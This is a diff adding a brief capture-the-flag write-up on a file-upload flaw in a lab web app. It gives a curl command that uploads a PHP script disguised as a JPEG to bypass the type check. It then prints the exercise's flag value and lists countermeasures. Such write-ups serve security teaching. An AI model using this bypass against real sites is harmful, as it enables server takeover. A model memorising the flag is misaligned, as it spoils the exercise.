@@ -1,0 +1,27 @@
+http://192.168.57.3/index.php?page=upload#
+
+In the upload page of the website, you can send a php file via curl.
+The Brower client side don't allow file with extend .php.
+But the server don't check the header of the file to know if it really a image that we send.
+We could send a script that will give us access to the server or something else. 
+
+curl -X POST -H 'Content-Type: multipart/form-data' -F 'Upload=simulate' -F 'uploaded=@script.php;type=image/jpeg' http://192.168.57.3/index.php?page=upload | grep flag
+
+-X: we make a special request, here a post 
+
+-F: mean that we summit from a from
+
+-H: we add some header
+
+flag = 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
+
+-------------------------- Countermeasure ----------------------------------------
+    - To prevent this we need to check the header of the file that is send. 
+    - Don't keep file in root directory.
+    - Don't keep execution permission , just read , write on this file.
+    - Scan for malware.
+    - Rename the file and keep the original name linked in a DB with the new name.
+    
+-------------------------- Script --------------------------------
+
+<script>yoyo</script>
